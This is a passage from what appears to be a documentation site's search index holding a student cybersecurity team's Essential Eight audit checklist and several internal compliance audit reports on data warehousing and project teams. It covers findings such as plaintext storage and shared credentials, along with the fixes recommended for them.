Templates/quarterly-audit-checklist#ml1-om-02--a-record-is-maintained-of-users-approved-to-run-macros","content":" Audit Procedure: Compare macro-enabled group membership to access requests. Evidence Required: Approval requests, group membership exports. Tools/Methods: Active Directory, Confluence Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-OM-03 — Macros embedded in files downloaded from the internet are blocked.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-om-03--macros-embedded-in-files-downloaded-from-the-internet-are-blocked","content":" Audit Procedure: Download Office files with macros and verify execution result. Evidence Required: E8MVT output, file logs, macro execution error logs. Tools/Methods: Office, GPO, E8MVT Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Restrict Admin Privileges​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#restrict-admin-privileges","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-RA-01 — Access to administrative privileges is granted only through formal approval processes.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ra-01--access-to-administrative-privileges-is-granted-only-through-formal-approval-processes","content":" Audit Procedure: Review access request forms and change control tickets. Evidence Required: Request logs, approval emails, workflow tickets. Tools/Methods: Active Directory, JIRA, Confluence Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-RA-02 — Privileged accounts are restricted from accessing the internet.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ra-02--privileged-accounts-are-restricted-from-accessing-the-internet","content":" Audit Procedure: Attempt to access internet from admin account; review enforcement. Evidence Required: Access logs, proxy blocks, firewall rules. Tools/Methods: Squid Proxy, FW ACLs, AD GPO Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-RA-03 — Privileged accounts are not used for email communication.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ra-03--privileged-accounts-are-not-used-for-email-communication","content":" Audit Procedure: Test mailbox functionality for admin accounts. Evidence Required: User directory exports, mail server configs, access logs. Tools/Methods: Exchange Admin Center, ADUC Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"User App Hardening​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#user-app-hardening","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-AH-01 — Web browsers do not process Java from internet websites.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ah-01--web-browsers-do-not-process-java-from-internet-websites","content":" Audit Procedure: Attempt to load Java content in Edge from known malicious site. Evidence Required: Screenshot of blocked Java content, registry keys. Tools/Methods: Edge browser, RegEdit, test website Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-AH-02 — Java content is disabled in Google Chrome.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ah-02--java-content-is-disabled-in-google-chrome","content":" Audit Procedure: Attempt Java content execution and verify result. Evidence Required: Chrome plugin settings, screenshots, blocked content. Tools/Methods: Chrome, test site, GPO Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"ML1-AH-03 — Java content is disabled in Mozilla Firefox.​","type":1,"pageTitle":"Quarterly Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/quarterly-audit-checklist#ml1-ah-03--java-content-is-disabled-in-mozilla-firefox","content":" Audit Procedure: Test Java plugin activation and loading behavior. Evidence Required: Firefox about:config, Java plugin settings. Tools/Methods: Firefox browser, plugin audit Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit. ","version":"Next","tagName":"h3"},{"title":"Data Warehousing Team Audit Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Data-Warehousing-Audit","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Data Warehousing Team Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Data-Warehousing-Audit#introduction","content":" The Data Warehousing team audit took place on Friday, September 6, 2024 between auditor, Jamison Begley, and Team Leader, Kaylin Lucas-Griffin. The purpose of this audit was to assess the conformity of the data warehousing team to Redback Operations’ ISMS policies, ethical considerations, and general governance concerns.  Before the day of the audit, I conducted my own research on the team and their work to get a better understanding of what they do at Redback Operations, though I also created a separate document with a range of questions that are developed to confirm or deny my findings.  On the day of the audit, I began with asking a few questions related to their team, the first being: “What data, and what type of data is being stored”. To which the response was that the data being stored is a collection from each project, though it is only sample data, and they are generally in the format of .csv, and .json files. This information is stored on a Deakin VM, meaning that the data is completely offline (no cloud storage), but for the time being the team is happy with its storage capabilities.  ","version":"Next","tagName":"h2"},{"title":"Audit​","type":1,"pageTitle":"Data Warehousing Team Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Data-Warehousing-Audit#audit","content":" The following text shows each audit point, compliance, observations, and action required if applicable.  ","version":"Next","tagName":"h2"},{"title":"Policy Compliance​","type":1,"pageTitle":"Data Warehousing Team Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Data-Warehousing-Audit#policy-compliance","content":" 1.1 – Are the correct encryption methods being used for data in storage and transmission?  No, data is transmitted and stored in plaintext.  Action Required: • Data transmission and storage needs to be in accordance with the company’s cryptography policy, which can be accessed on our company repos.  1.2 – Are the related DLP Policies being adhered to?  No, Access Controls are not being adhered to as everyone as root access No, Encryption is not being adhered to (according to 1.1). No, Content Inspection is not being adhered to, though it was stated that some files undergo content inspection – this needs to be all files. No, Regular Backups do not occur (it was stated that no backups occur).  Action Required: • DLP Policies need to be adhered to by implementing relevant access controls (limiting who can access/modify the data). • Encryption Policy needs to be adhered to (according to 1.1). • All data must undergo content inspection when received from each project. • Regular data backups must take place to ensure recovery of data if lost.  1.3 – Are the related Data Classification Policies being adhered to?  Yes, the Data Classification Policies are being adhered to, and data is categorised accordingly.  Action Required: • No action is required.  1.4 – Have forms of physical security for data protection been implemented?  Yes, password protection has been implemented on the Deakin VM, protection data from physical interception.  Action Required: • No action is required.  1.5 – Have forms of digital security for data protection been implemented?  Yes, data is protected behind Deakin’s internet servers – individuals must be connected to the Deakin VM to access the data.  Action Required: • No action is required.  1.6 – Have EASM risks been identified?  No, the team is aware of potential risks and attacks, though there is no documentation of these potential risks.  Action Required: • Documentation of potential External Attack Surface Management risks needs to be created – for more information access the EASM policy on our company’s repos.  1.7 – Have all employees undergone the appropriate User Awareness Training?  No, the team was unaware of the “Cybersecurity User Awareness Training” document.  Action Required: • Employees must read over the Cybersecurity User Awareness Training document so they can better understand what policies and procedures must be followed, and they can better their understanding of potential risks to their data.  ","version":"Next","tagName":"h3"},{"title":"Ethical Considerations and Requirements​","type":1,"pageTitle":"Data Warehousing Team Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Data-Warehousing-Audit#ethical-considerations-and-requirements","content":" 2.1 – Are all forms of data collection briefed with customers, and is consent gathered?  N/A – The team only stores the data; they do not collect it.  Action Required: • No action is required.  2.2 – Has all collected information and data been classified with data classification requirements?  Yes, in reference to 1.3, all data collected is categorised according to the Data Classification Policies.  Action Required: • No action is required.  2.3 – Is data anonymity used to protect the privacy of customers?  Yes, data anonymity is used for project 2 data, as this is the only project with personally identifiable information.  Action Required: • No action is required.  2.4 – Is the cryptography policy being adhered to?  No, in reference to 1.1, the cryptography is not being adhered to as all data is stored and transmitted in plaintext.  Action Required: • In reference to 1.1, Data transmission and storage needs to be in accordance with the company’s cryptography policy, which can be accessed on our company repos.  2.5 – Is data minimalization being put in place when collecting data?  Yes, only data that is relevant to Redback Operations’ company directive and goals is being collected.  Action Required: • No action is required.  2.6 – Are the relevant ISMS policies being adhered to when required?  No, the team is unaware of the policies, therefore they are not being adhered to.  Action Required: • The team must conduct their own research and read through the ISMS policies to gain a better understanding of how to comply – this can be done through the User Awareness Training.  ","version":"Next","tagName":"h3"},{"title":"Governance​","type":1,"pageTitle":"Data Warehousing Team Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Data-Warehousing-Audit#governance","content":" 3.1 – Is the tea, adhering to the company’s governance framework?  Yes, all data is used for the company’s goals and directive. Everything on the VM is within Redback’s scope of operations.  Action Required: • No action is required.  3.2 – Are team roles and responsibilities clearly defined and documented?  Yes, sub-teams are classified and documented, also known as the “Data Warehousing Solutions”.  Action Required: • No action is required.  3.3 – Is there a risk management plan in place?  No, there is no risk management plan in place, there is also no evidence of potential risks being identified.  Action Required: • A document needs to be created outlining potential risks, and how to manage them.  3.4 – Is there an incident response plan in place?  No, there is not an incident response plan in place, nor is there a document to list potential incident.  Action Required: • An incident response plan, including potential incidents, their impact, and how to appropriately respond to them must be created.  3.5 – Are incidents logged and reviewed for continuous improvement?  No, as there is no incident response plan, incidents are not logged and regularly reviewed for continuous improvement.  Action Required: • An incident logging document must be created and updated in response to incidents whenever they occur.  ","version":"Next","tagName":"h3"},{"title":"Overall Findings and Recommendation​","type":1,"pageTitle":"Data Warehousing Team Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Data-Warehousing-Audit#overall-findings-and-recommendation","content":" This audit outlined various gaps in the Data Warehousing team’s ISMS policy compliance and general awareness, their compliance to ethical considerations and overall governance.  On the topic of policy compliance, the team needs to read through the ISMS policies on our company repos and adjust their working style accordingly, with main points of interest being encryption, data loss prevention, risk management and overall user training. The User Awareness Training should be treated as a high priority, as it will help employees gain a greater understanding of the practices that need to be in place to maintain a safe and secure environment for our data.  Relevant to ethical considerations and requirements, data confidentiality and integrity can only be guaranteed if the cryptography policy is understood and adhered to, as data should not be stored and transmitted in plaintext.  Finally, referring to the general governance points, there should be regular risk identification being documented, so the team can account for, and avoid any potential risks. Further, a risk management plan and incident response plan should be developed, alongside the logging of incidents to allow for continuous improvement to our security posture.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Data Warehousing Team Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Data-Warehousing-Audit#conclusion","content":" After the audit, a few more questions were asked to gain a better understanding of the direction that the Data Warehousing team aims to take.  Kaylin ended by saying that he and his team “want to have governance and the correct security in place to be an elite team, and an elite project”. He wants their service to be a “self-service for employees”, and to have cloud storage and access to make it easier to “provide a service to the rest of the projects as somewhere that they can store and access their data”. ","version":"Next","tagName":"h2"},{"title":"Project 2 - Elderly Wearable Technology Audit Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/audit-report-project-2","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Project 2 - Elderly Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/audit-report-project-2#introduction","content":" This report presents the findings from the audit of Project 2: Elderly Wearable Technology which aims to improve the quality of life for elderly individuals through wearable devices that provide health monitoring, emergency alerts, and social connectivity. The audit focused on evaluating the project’s compliance with Redback Operations' Information Security Management System (ISMS) policies, particularly regarding data handling, encryption, and security practices.  The audit interview took place on 12/09/2024 with Manan Purvish Gangar, the project lead. It was revealed that both the project team and the Data Warehousing Team were unaware of Redback’s ISMS policies, resulting in several areas of non-compliance. This report outlines these findings, provides recommendations for improvement, and details the actions required to ensure compliance moving forward.    ","version":"Next","tagName":"h2"},{"title":"Audit​","type":1,"pageTitle":"Project 2 - Elderly Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/audit-report-project-2#audit","content":" ","version":"Next","tagName":"h2"},{"title":"Policy Compliance​","type":1,"pageTitle":"Project 2 - Elderly Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/audit-report-project-2#policy-compliance","content":" Are the correct encryption methods being used for data in storage and transmission? No, encryption controls are not being adhered to as data is transmitted and stored in plaintext. Action Required: Implement AES-256 encryption for all sensitive data in storage and secure transmission protocols (TLS/SSL).Train employees on encryption standards and conduct regular reviews. Are the related DLP Policies being adhered to? No, DLP policy requirements are not met. Action Required: Implement data classification per policy (public, internal use, confidential, restricted).Apply role-based access and the least privilege principle.Encrypt sensitive data in transit and storage using AES-256.Introduce watermarking, screen-capture prevention, and clipboard controls.Implement automated content scanning to detect unauthorized data leaks.Conduct regular audits and reviews to ensure DLP compliance. Are the related Data Classification Policies being adhered to? No, data classification practices are not applied. Action Required: Classify all data per policy specifications and ensure encryption and access controls align with data sensitivity.Regularly review data classifications. Have forms of physical security for data protection been implemented? No, adequate physical security measures are absent. Action Required: Secure devices containing sensitive data and restrict physical access to essential personnel only.Implement automatic device lockouts after periods of inactivity. Have forms of digital security for data protection been implemented? No, essential digital security practices are not enforced. Action Required: Regularly update systems with security patches, deploy comprehensive malware protection, and enforce least privilege - access. Have EASM risks been identified? No, there is no identification of EASM risks. Action Required: Perform EASM risk assessments and classify external risks. Have appropriate EASM risk management strategies been implemented? No, EASM risk management strategies are lacking. Action Required: Develop and implement EASM strategies ensuring consistent monitoring and updating based on the latest threat intelligence. Have all employees undergone the appropriate User Awareness Training? No, employees have not completed required training. Action Required: Employees must read the Cybersecurity User Awareness Training document to ensure they are informed about security practices and policies.    ","version":"Next","tagName":"h3"},{"title":"Ethical Considerations and Requirements​","type":1,"pageTitle":"Project 2 - Elderly Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/audit-report-project-2#ethical-considerations-and-requirements","content":" Are all forms of data collection briefed with customers and consent gathered? No, most of the data is gathered through public domains but there is private data involved and the ethical considerations for handling it are still under discussion. Action Required: Finalize the ethical considerations for the private data.Ensure all forms of data collection, especially for private data, are clearly communicated to customers and obtain explicit consent before proceeding with any data collection. Has all collected information and data been classified according to data classification requirements? No, collected data has not been properly classified. Action Required: Classify all collected data according to the company's data classification policy to ensure proper handling and protection of sensitive information. Is data anonymity used to protect the privacy of customers? No, data anonymization is still a work in progress. Action Required: Finalize and implement data anonymization protocols to ensure customer privacy is protected. Is the cryptography policy being adhered to? No, encryption standards are not being followed as Fernet (128-bit encryption) is used instead of the required 256-bit encryption. Action Required: Follow the cryptography policy by implementing 256-bit encryption for sensitive data both in transit and at rest. Is data minimization in place when collecting data? Yes, data minimization practices are being applied. Action Required: No action required. Are ISMS (Information Security Management System) policies being adhered to when required? No, ISMS policies are not being followed. Action Required: Review and ensure adherence to ISMS policies across all relevant areas of the organization, including data handling, encryption, and access control.    ","version":"Next","tagName":"h3"},{"title":"Governance​","type":1,"pageTitle":"Project 2 - Elderly Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/audit-report-project-2#governance","content":" Is the team adhering to the company’s governance framework? No, the team is not aware of the company’s governance framework. Action Required: Provide the team with training and documentation on the company's governance framework and ensure adherence through regular check-ins. Are team roles and responsibilities clearly defined and documented? Yes, team roles and responsibilities are defined and documented. Action Required: No action required. Is there a risk management plan in place? No, there is no formal risk management plan. Action Required: Develop and implement a comprehensive risk management plan that includes identifying, assessing, and mitigating potential risks. Is there an incident response plan in place? No, an incident response plan is not in place. Action Required: Create and implement an incident response plan to ensure prompt and efficient handling of any security incidents or breaches. Are incidents logged and reviewed for continuous improvement? No, incidents are not being logged. Action Required: Establish a process to log all incidents and regularly review them to improve security measures and prevent recurrence.    ","version":"Next","tagName":"h3"},{"title":"Overall Findings and Recommendations​","type":1,"pageTitle":"Project 2 - Elderly Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/audit-report-project-2#overall-findings-and-recommendations","content":" The audit of Project 2: Elderly Wearable Technology uncovered significant non-compliance with Redback’s ISMS policies. Both the Project 2 team and the Data Warehousing Team are unaware of the company’s security policies, resulting in issues with encryption, data classification, and governance.  The lack of encryption is a major concern as data is stored and transmitted in plaintext. Additionally, data classification has not been implemented, and DLP policies are not followed. There is no formal risk management or incident response plan, leaving the project vulnerable. Moreover, the required Cybersecurity User Awareness Training has not been completed, and there is no process for incident logging and review.  The first and most important step is for all team members to familiarize themselves with Redback’s ISMS policies. This will ensure compliance with encryption standards, data classification, and DLP requirements. Implementing risk management and incident response plans is also essential. Regular audits should be conducted to reinforce compliance and ensure all security measures are properly applied.    ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Project 2 - Elderly Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/audit-report-project-2#conclusion","content":" The audit of Project 2: Elderly Wearable Technology revealed key gaps in compliance with Redback’s ISMS policies, primarily due to a lack of awareness across both the Data Warehousing and project teams. Ensuring that all team members read and follow the ISMS policies is crucial for improving security practices. With the recommended actions in place, the project can move forward securely, aligned with company standards, and ensuring the protection of data and overall success. ","version":"Next","tagName":"h2"},{"title":"Cybersecurity Assessment Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#1-introduction","content":" This report presents the outcomes of the Essential Eight Maturity Level 1 (ML1) assessment focused on the “Restrict Administrative Privileges” control category (ML1-RA) for the Redback Data Warehousing environment. The Australian Cyber Security Centre’s (ACSC) Essential Eight is a set of prioritized strategies to mitigate cybersecurity incidents, and ML1 establishes the foundational baseline for organizations to defend against common threats.  The objective of this assessment is to determine the extent to which administrative privilege management practices are implemented in the Redback data warehousing infrastructure and to identify opportunities to improve alignment with best practices in secure system administration.    ","version":"Next","tagName":"h2"},{"title":"2. System Overview and Scope​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#2-system-overview-and-scope","content":" The target system is the Redback Data Warehousing Virtual Machine (VM), which serves as the core platform for storing and processing structured and semi-structured data across multiple internal Redback projects. The data warehouse:  Hosts file upload services, MinIO object storage, and MongoDB for project-specific ingestion pipelines.Is used by different student project teams for data aggregation, visualization, and downstream analysis using Dremio, Streamlit dashboards, and Jupyter notebooks.Is a Deakin University-managed on-premises system, accessible only via VPN and internal network.Has no direct internet exposure and is provisioned and patched by Deakin IT Services, not Redback students.  While Redback students and mentors manage application-level services within the VM, the base operating system, patching, and privileged access controls fall partially within their administrative responsibility, particularly when creating new users, accessing Docker containers, and segmenting project environments.    ","version":"Next","tagName":"h2"},{"title":"3. Assessment Methodology​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#3-assessment-methodology","content":" The audit followed Redback’s internal compliance testing workflow aligned to the ACSC Essential Eight Assessment Guide. For each ML1-RA test case, the following process was applied:  Review of Active Directory (AD) roles and user groupsAnalysis of Group Policy Objects (GPOs) applied to privileged and unprivileged environmentsInterviews with mentors and infrastructure stakeholders (e.g., Ben Dang, Daezel Goyal)Inspection of logs from administrative sessions, credential provisioning, and container activityManual validation of privilege escalation attempts using tools like runas, RDP, PowerShell Remoting (PSRemote)Examination of shared and segregated VM environments, credential reuse, and exception handling    ","version":"Next","tagName":"h2"},{"title":"4. Summary of Results​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#4-summary-of-results","content":" Test ID\tControl Objective\tCompliance StatusML1-RA01\tAdmin access granted only via approved requests\tImplemented ML1-RA02\tAdmin accounts cannot access internet/web services\tImplemented ML1-RA03\tAdmin accounts do not have email capabilities\tImplemented ML1-RA04\tAdmin activities isolated from unprivileged environments\tImplemented ML1-RA05\tStandard users cannot access privileged environments\tImplemented ML1-RA06\tStandard users cannot elevate via PSRemote/RDP\tImplemented ML1-RA07\tAdmin accounts restricted from unprivileged workstations\tPartially Implemented ML1-RA08\tPrivilege elevation via tools like runas or remote management blocked\tImplemented ML1-RA09\tQuarterly review of administrative accounts\tPartially Implemented ML1-RA10\tSeparate identities used for admin and user roles\tPartially Implemented    ","version":"Next","tagName":"h2"},{"title":"5. Detailed Findings and Analysis​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#5-detailed-findings-and-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-RA-01: Approved Justification for Admin Access​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#ml1-ra-01-approved-justification-for-admin-access","content":" Admin access is provisioned via internal request workflows managed through JIRA. Each access instance uses credentials issued per session, documented in Confluence. Fully implemented.  ","version":"Next","tagName":"h3"},{"title":"ML1-RA-02: Restricted Internet Access for Admin Accounts​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#ml1-ra-02-restricted-internet-access-for-admin-accounts","content":" Firewall rules and Squid proxy logs confirm admin accounts cannot access the internet. All privileged operations occur on internal networks or bastion hosts. Fully implemented.  ","version":"Next","tagName":"h3"},{"title":"ML1-RA-03: No Mail Capability for Admin Accounts​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#ml1-ra-03-no-mail-capability-for-admin-accounts","content":" SMTP and IMAP are disabled for admin accounts. No active mailboxes are found for admin users. Fully implemented.  ","version":"Next","tagName":"h3"},{"title":"ML1-RA-04: Segregated Administrative Environments​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#ml1-ra-04-segregated-administrative-environments","content":" Privileged tasks occur in isolated container environments. VLANs and container runtime segmentation ensure logical separation. Fully implemented.  ","version":"Next","tagName":"h3"},{"title":"ML1-RA-05: Blocking Unprivileged Access to Admin Systems​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#ml1-ra-05-blocking-unprivileged-access-to-admin-systems","content":" AD policies block standard user login to privileged systems. Logs confirm enforcement of role separation. Fully implemented.  ","version":"Next","tagName":"h3"},{"title":"ML1-RA-06: Blocking Remote Elevation (PSRemote, RDP)​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#ml1-ra-06-blocking-remote-elevation-psremote-rdp","content":" Attempts from standard users to use PSRemote or RDP are denied and logged. Fully implemented.  ","version":"Next","tagName":"h3"},{"title":"ML1-RA-07: Restriction of Admin Logins on Unprivileged Systems​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#ml1-ra-07-restriction-of-admin-logins-on-unprivileged-systems","content":" GPOs restrict admin logins to user environments, but shared containers undermine strict isolation. Partially implemented.  ","version":"Next","tagName":"h3"},{"title":"ML1-RA-08: Blocking Privilege Elevation via Tools​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#ml1-ra-08-blocking-privilege-elevation-via-tools","content":" Privilege escalation attempts using runas, RDP, and others are denied. Event logs confirm technical enforcement. Fully implemented.  ","version":"Next","tagName":"h3"},{"title":"ML1-RA-09: Quarterly Admin Account Review​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#ml1-ra-09-quarterly-admin-account-review","content":" Reviews are performed manually, with no automation for stale credential alerts. Partially implemented.  ","version":"Next","tagName":"h3"},{"title":"ML1-RA-10: Separate Identities for Admin and User Roles​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#ml1-ra-10-separate-identities-for-admin-and-user-roles","content":" Admins use +admin suffixed accounts, but shared credentials are used for services like Dremio. Partially implemented.    ","version":"Next","tagName":"h3"},{"title":"6. Key Risks Identified​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#6-key-risks-identified","content":" Shared user environments expose risk of config leakage or accidental privilege overlap.Use of shared admin credentials reduces accountability.Manual admin tracking may delay deactivation or revocation of privileges.    ","version":"Next","tagName":"h2"},{"title":"7. Recommendations​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#7-recommendations","content":" Strengthen isolation between user environments or containers.Eliminate shared service credentials; adopt secrets management (e.g., AWS Secrets Manager, Vault).Automate admin account reviews with AD monitoring scripts and audit tools.Introduce a formal exception register to manage deviations from RBAC.    ","version":"Next","tagName":"h2"},{"title":"8. Conclusion​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#8-conclusion","content":" The Redback Data Warehousing team demonstrates strong foundational compliance with the Restrict Administrative Privileges strategy under ACSC Essential Eight Maturity Level One. Controls are in place to manage, monitor, and restrict elevated access. Improvements in credential hygiene, process automation, and environment segmentation will enhance overall resilience and reduce risks of unauthorized administrative activity.    ","version":"Next","tagName":"h2"},{"title":"Acknowledgment​","type":1,"pageTitle":"Cybersecurity Assessment Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Essential 8 ML1 Data Warehouse Team#acknowledgment","content":" We acknowledge the support and contributions of the following entities and communities in the completion of this cybersecurity assessment:  Deakin University – For providing infrastructure, guidance, and a robust cybersecurity learning environment.OpenAI and ChatGPT – For assistance in drafting and refining audit documentation with clarity and professionalism.Traditional Owners of the Land – We pay our respects to the Wadawurrung people, the Traditional Custodians of the land on which we study and work, and honour their enduring connection to land, waters, and culture.   ","version":"Next","tagName":"h2"},{"title":"VR Sun Cycle Audit Report - September 2024","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#introduction","content":" The VR Sun Cycle Smart Bike audit was conducted on Saturday the 14th of September between I, Ali Demirovski, and team leader, Johnathon David Lowden. Additionally, another team leader, Ethan Byrne-Staunton, was also questioned for clarification on some points.  This audit evaluates the development process of a Virtual Reality (VR) Smart Bike, focusing on key aspects such as data protection, hardware and software challenges, and adherence to cybersecurity policies.  The objective of this audit is to assess the project's current state, identify potential risks, and provide recommendations to improve overall security and compliance.  ","version":"Next","tagName":"h2"},{"title":"GENERAL AUDIT POINTS - Policy Compliance​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC 